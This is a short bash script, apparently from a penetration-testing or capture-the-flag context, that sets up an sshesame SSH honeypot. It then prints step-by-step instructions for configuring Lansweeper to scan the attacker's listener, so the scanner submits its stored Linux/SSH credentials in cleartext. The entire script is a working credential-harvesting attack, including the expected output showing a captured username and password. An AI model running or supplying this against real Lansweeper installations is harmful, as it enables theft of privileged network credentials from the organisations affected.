#!/bin/bash
# Lansweeper Credential Harvesting - SSH Honeypot Setup
# Usage: ./setup-sshesame-honeypot.sh <listen_ip> <listen_port>

set -e

if [ -z "$1" ] || [ -z "$2" ]; then
    echo "Usage: $0 <listen_ip> <listen_port>"
    echo "Example: $0 10.10.14.79 2022"
    exit 1
fi

LISTEN_IP="$1"
LISTEN_PORT="$2"
CONFIG_FILE="sshesame.conf"

echo "[*] Setting up SSH honeypot for Lansweeper credential harvesting"
echo "[*] Listen address: ${LISTEN_IP}:${LISTEN_PORT}"

# Check if sshesame is installed
if ! command -v sshesame &> /dev/null; then
    echo "[*] Installing sshesame..."
    sudo apt update
    sudo apt install -y sshesame
fi

# Create configuration
cat > "${CONFIG_FILE}" << EOF
server:
  listen_address: ${LISTEN_IP}:${LISTEN_PORT}
EOF

echo "[*] Configuration saved to ${CONFIG_FILE}"
echo ""
echo "[+] Honeypot ready. Start with:"
echo "    sshesame --config ${CONFIG_FILE}"
echo ""
echo "[+] Configure Lansweeper:"
echo "    1. Scanning → Scanning Targets → Add Scanning Target"
echo "    2. Type: IP Range or Single IP = ${LISTEN_IP}"
echo "    3. SSH Port: ${LISTEN_PORT}"
echo "    4. Map Linux/SSH credentials to target"
echo "    5. Click 'Scan now'"
echo ""
echo "[+] Expected output:"
echo "    authentication for user \"<username>\" with password \"<password>\" accepted"
echo "    connection with client version \"SSH-2.0-RebexSSH_5.0.x\" established"
